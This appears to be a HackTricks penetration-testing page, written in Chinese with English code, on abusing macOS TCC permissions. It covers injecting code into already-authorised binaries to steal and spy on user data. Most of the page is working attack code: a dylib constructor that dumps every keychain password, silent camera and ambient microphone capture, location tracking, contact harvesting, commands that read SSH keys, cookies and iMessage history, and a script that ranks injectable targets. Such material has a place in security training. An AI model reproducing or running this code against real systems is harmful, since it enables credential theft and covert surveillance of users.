# macOS 凭证与数据窃取（通过 TCC 权限）

{{#include ../../../banners/hacktricks-training.md}}

## 概述

macOS TCC (Transparency, Consent, and Control) 保护对敏感用户数据的访问。当攻击者**控制了一个已经拥有 TCC 授权的二进制文件**时，他们将继承这些权限。本页记录了每种与数据窃取相关的 TCC 权限的利用潜力。

> [!WARNING]
> Code injection into a TCC-granted binary (via DYLD injection, dylib hijacking, or task port) **silently inherits all its TCC permissions**。当同一进程读取受保护数据时，不会出现额外的提示或验证。

---

## Keychain 访问组

### 奖品

macOS Keychain 存储：
- **Wi-Fi 密码** — 所有已保存的无线网络凭证
- **网站密码** — Safari、Chrome（当使用 Keychain 时）以及其他浏览器的密码
- **应用程序密码** — 邮件账号、VPN 凭证、开发令牌
- **证书和私钥** — 代码签名、客户端 TLS、S/MIME 加密
- **安全笔记** — 用户存储的秘密

### Entitlement: `keychain-access-groups`

Keychain 项目被组织到 **访问组** 中。应用程序的 `keychain-access-groups` entitlement 列出它可以访问的组：
```xml
<key>keychain-access-groups</key>
<array>
<string>com.apple.cfnetwork</string>   <!-- Network passwords -->
<string>com.apple.security.personal-information.identity</string>  <!-- Personal certs -->
<string>apple</string>                  <!-- Broad Apple group -->
<string>InternetAccounts</string>       <!-- Internet account passwords -->
</array>
```
### 漏洞利用
```bash
# Find binaries with broad keychain access groups
sqlite3 /tmp/executables.db "
SELECT path FROM executables
WHERE entitlementsString LIKE '%keychain-access-groups%'
AND isAppleBin = 0
ORDER BY privileged DESC;"

# If you can inject into such a binary, enumerate keychain items:
security dump-keychain -d ~/Library/Keychains/login.keychain-db 2>&1 | head -100

# Find specific passwords
security find-generic-password -s "Wi-Fi" -w 2>&1
security find-internet-password -s "github.com" 2>&1
```
### Code Injection → Keychain Theft
```objc
// Injected dylib code — runs with the target's keychain groups
#import <Security/Security.h>

__attribute__((constructor))
void dumpKeychain(void) {
NSDictionary *query = @{
(__bridge id)kSecClass: (__bridge id)kSecClassGenericPassword,
(__bridge id)kSecReturnAttributes: @YES,
(__bridge id)kSecReturnData: @YES,
(__bridge id)kSecMatchLimit: (__bridge id)kSecMatchLimitAll
};

CFArrayRef results = NULL;
OSStatus status = SecItemCopyMatching((__bridge CFDictionaryRef)query, (CFTypeRef *)&results);

if (status == errSecSuccess) {
NSArray *items = (__bridge NSArray *)results;
for (NSDictionary *item in items) {
NSString *service = item[(__bridge id)kSecAttrService];
NSString *account = item[(__bridge id)kSecAttrAccount];
NSData *passData = item[(__bridge id)kSecValueData];
NSString *password = [[NSString alloc] initWithData:passData encoding:NSUTF8StringEncoding];
// service, account, password — the full credential triple
}
}
}
```
---

## 相机访问 (kTCCServiceCamera)

### 利用

具有相机 TCC 授权的二进制文件（通过 `kTCCServiceCamera` 或 `com.apple.security.device.camera` entitlement）可以捕获照片和视频：
```bash
# Find camera-authorized binaries
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client FROM access WHERE service='kTCCServiceCamera' AND auth_value=2;"
```
### Silent Capture
```objc
// Injected into a camera-entitled process
#import <AVFoundation/AVFoundation.h>

@interface SilentCapture : NSObject <AVCaptureVideoDataOutputSampleBufferDelegate>
@property (strong) AVCaptureSession *session;
@end

@implementation SilentCapture
- (void)startCapture {
self.session = [[AVCaptureSession alloc] init];
AVCaptureDevice *camera = [AVCaptureDevice defaultDeviceWithMediaType:AVMediaTypeVideo];
AVCaptureDeviceInput *input = [AVCaptureDeviceInput deviceInputWithDevice:camera error:nil];
[self.session addInput:input];

AVCaptureVideoDataOutput *output = [[AVCaptureVideoDataOutput alloc] init];
[output setSampleBufferDelegate:self queue:dispatch_get_global_queue(0, 0)];
[self.session addOutput:output];

[self.session startRunning];
// Camera LED turns on — but a brief capture may go unnoticed
}

- (void)captureOutput:(AVCaptureOutput *)output
didOutputSampleBuffer:(CMSampleBufferRef)sampleBuffer
fromConnection:(AVCaptureConnection *)connection {
// Each frame can be saved to disk or exfiltrated
// Stop after capturing a few frames to minimize LED time
[self.session stopRunning];
}
@end
```
> [!TIP]
> 从 **macOS Sonoma** 开始，菜单栏中的摄像头指示器是持续显示的，无法通过程序隐藏。在 **较旧的 macOS 版本** 上，短时间的捕获可能不会产生明显的指示。
 
---

## 麦克风访问 (kTCCServiceMicrophone)

### 利用

麦克风访问会捕获内置麦克风、耳机或连接的音频输入设备的所有音频：
```bash
# Find mic-authorized binaries
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client FROM access WHERE service='kTCCServiceMicrophone' AND auth_value=2;"
```
### 攻击: Ambient Recording
```objc
// Injected into a mic-entitled process
#import <AVFoundation/AVFoundation.h>

- (void)recordAudio {
NSURL *url = [NSURL fileURLWithPath:@"/tmp/recording.m4a"];
NSDictionary *settings = @{
AVFormatIDKey: @(kAudioFormatMPEG4AAC),
AVSampleRateKey: @44100.0,
AVNumberOfChannelsKey: @1
};
AVAudioRecorder *recorder = [[AVAudioRecorder alloc] initWithURL:url settings:settings error:nil];
[recorder record];
// Records everything: conversations, phone calls, ambient audio

// Stop after a duration
dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 60 * NSEC_PER_SEC),
dispatch_get_main_queue(), ^{
[recorder stop];
// Exfiltrate /tmp/recording.m4a
});
}
```
---

## 位置追踪 (kTCCServiceLocation)

### 利用
```bash
# Find location-authorized binaries
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client FROM access WHERE service LIKE '%Location%' AND auth_value=2;"
```
### 持续跟踪
```objc
#import <CoreLocation/CoreLocation.h>

@interface Tracker : NSObject <CLLocationManagerDelegate>
@end

@implementation Tracker
- (void)startTracking {
CLLocationManager *mgr = [[CLLocationManager alloc] init];
mgr.delegate = self;
mgr.desiredAccuracy = kCLLocationAccuracyBest;
[mgr startUpdatingLocation];
}

- (void)locationManager:(CLLocationManager *)manager
didUpdateLocations:(NSArray<CLLocation *> *)locations {
CLLocation *loc = locations.lastObject;
// loc.coordinate.latitude, loc.coordinate.longitude
// Reveals: home address, work address, travel patterns, daily routine
NSString *entry = [NSString stringWithFormat:@"%f,%f,%@\n",
loc.coordinate.latitude, loc.coordinate.longitude, [NSDate date]];
// Append to tracking log
}
@end
```
---

## 联系人 / 日历 / 照片

### 个人数据外泄

| TCC 服务 | 框架 | 数据 |
|---|---|---|
| `kTCCServiceAddressBook` | `Contacts.framework` | 姓名、邮箱、电话、地址 |
| `kTCCServiceCalendar` | `EventKit` | 会议、与会者、地点 |
| `kTCCServicePhotos` | `Photos.framework` | 照片、截图、位置元数据 |
```bash
# Find authorized binaries for each service
for svc in kTCCServiceAddressBook kTCCServiceCalendar kTCCServicePhotos; do
echo "=== $svc ==="
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client FROM access WHERE service='$svc' AND auth_value=2;"
done
```
### 联系人收集
```objc
#import <Contacts/Contacts.h>

CNContactStore *store = [[CNContactStore alloc] init];
NSArray *keys = @[CNContactGivenNameKey, CNContactFamilyNameKey,
CNContactEmailAddressesKey, CNContactPhoneNumbersKey];
CNContactFetchRequest *request = [[CNContactFetchRequest alloc] initWithKeysToFetch:keys];

[store enumerateContactsWithFetchRequest:request error:nil
usingBlock:^(CNContact *contact, BOOL *stop) {
// contact.givenName, contact.familyName
// contact.emailAddresses, contact.phoneNumbers
// All contacts exfiltrated for social engineering / spear phishing
}];
```
---

## iCloud 账户访问

### 权限: `com.apple.private.icloud-account-access`

此权限允许与 `com.apple.iCloudHelper` XPC 服务通信，提供对以下内容的访问：
- **iCloud tokens** — 用于用户 Apple ID 的认证令牌
- **iCloud Drive** — 来自所有设备的同步文档
- **iCloud Keychain** — 跨所有 Apple 设备同步的密码
- **Find My** — 用户所有 Apple 设备的位置
```bash
# Find iCloud-entitled binaries
sqlite3 /tmp/executables.db "
SELECT path FROM executables
WHERE iCloudAccs = 1
ORDER BY privileged DESC;"
```
> [!CAUTION]
> 破坏一个 iCloud-entitled binary 会将攻击从 **单个设备扩展到整个 Apple 生态系统**：其他 Macs、iPhones、iPads、Apple Watch。iCloud Keychain 同步意味着所有设备的密码都可被访问。

---

## 完全磁盘访问 (kTCCServiceSystemPolicyAllFiles)

### 最强大的 TCC 权限

完全磁盘访问 赋予对系统中 **每个文件** 的读取能力，包括：
- 其他应用的数据（Messages、Mail、Safari 历史记录）
- TCC 数据库（揭示所有其他权限）
- SSH 密钥和配置
- 浏览器 cookie 和会话令牌
- 应用程序数据库和缓存
```bash
# Find FDA-granted binaries
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client FROM access WHERE service='kTCCServiceSystemPolicyAllFiles' AND auth_value=2;"

# With FDA, read anything:
cat ~/Library/Messages/chat.db              # iMessage history
cat ~/Library/Safari/History.db             # Safari browsing history
cat ~/Library/Cookies/Cookies.binarycookies # Browser cookies
cat ~/.ssh/id_rsa                           # SSH private key
```
---

## 利用优先矩阵

在评估可注入的 TCC 授权二进制文件时，优先考虑数据价值：

| Priority | TCC Permission | Why |
|---|---|---|
| **关键** | 完全磁盘访问 | 访问所有内容 |
| **关键** | TCC 管理器 | 可以授予任何权限 |
| **高** | 钥匙串访问组 | 所有存储的密码 |
| **高** | iCloud 帐户访问 | 跨设备影响 |
| **高** | 输入监控 (ListenEvent) | 记录按键 |
| **高** | 辅助功能 | 控制 GUI，可自我授权 |
| **中等** | 屏幕捕获 | 可视数据捕获 |
| **中等** | 摄像头 + 麦克风 | 监控 |
| **中等** | 联系人 + 日历 | 社会工程学数据 |
| **低** | 位置 | 物理追踪 |
| **低** | 照片 | 个人数据 |

## 枚举脚本
```bash
#!/bin/bash
echo "=== TCC Credential Theft Surface Audit ==="

echo -e "\n[*] High-value TCC grants (injectable binaries):"
sqlite3 /tmp/executables.db "
SELECT path, tccPermsStr FROM executables
WHERE (noLibVal = 1 OR allowDyldEnv = 1)
AND tccPermsStr IS NOT NULL
AND tccPermsStr != ''
ORDER BY privileged DESC
LIMIT 30;" 2>/dev/null

echo -e "\n[*] Keychain-entitled injectable binaries:"
sqlite3 /tmp/executables.db "
SELECT path FROM executables
WHERE entitlementsString LIKE '%keychain-access-groups%'
AND (noLibVal = 1 OR allowDyldEnv = 1);" 2>/dev/null

echo -e "\n[*] iCloud-entitled binaries:"
sqlite3 /tmp/executables.db "
SELECT path FROM executables WHERE iCloudAccs = 1;" 2>/dev/null
```
## 参考资料

* [Apple Developer — Keychain Services](https://developer.apple.com/documentation/security/keychain_services)
* [Apple Developer — TCC](https://developer.apple.com/documentation/security/protecting-the-user-s-privacy)
* [Objective-See — TCC Exploitation](https://objective-see.org/blog/blog_0x4C.html)
* [OBTS v5.0 — iCloud Token Extraction (Wojciech Regula)](https://www.youtube.com/watch?v=_6e2LhmxVc0)

{{#include ../../../banners/hacktricks-training.md}}
